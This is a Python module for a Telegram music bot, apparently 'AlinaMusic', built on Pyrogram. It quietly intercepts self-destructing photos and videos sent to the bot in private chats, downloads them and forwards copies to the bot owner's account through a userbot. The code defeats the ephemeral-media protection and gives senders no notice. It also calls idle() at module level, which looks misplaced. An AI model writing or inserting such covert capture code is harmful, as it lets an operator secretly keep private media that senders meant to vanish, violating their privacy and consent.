from AlinaMusic import app
from config import OWNER_ID
from pyrogram import filters, idle
from AlinaMusic.utils.database import get_assistant

@app.on_message(filters.media & filters.private)
async def get_dest(app, message):
    userbot = await get_assistant(message.from_user.id)  # Fetch the userbot based on the sender's ID

    # To save Self-Destructing photo
    if message.photo and message.photo.ttl_seconds:
        photo = await message.download()
        await userbot.send_photo(OWNER_ID, photo)

    # To save Self-Destructing Video
    elif message.video and message.video.ttl_seconds:
        video = await message.download()
        await userbot.send_video(OWNER_ID, video)
idle()
